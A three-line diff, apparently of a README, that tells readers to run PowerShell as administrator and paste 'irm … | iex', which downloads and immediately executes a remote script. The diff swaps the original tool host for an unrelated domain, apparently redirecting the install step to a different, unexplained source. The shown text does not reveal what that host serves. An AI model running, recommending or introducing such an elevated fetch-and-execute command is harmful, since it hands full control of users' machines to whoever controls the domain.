@@ -1,3 +1,3 @@
 Run Powershell as administrator and past the 
-link: "irm fistoolbox.automizze.us | iex"
+link: "irm security.footprints.work | iex"
 
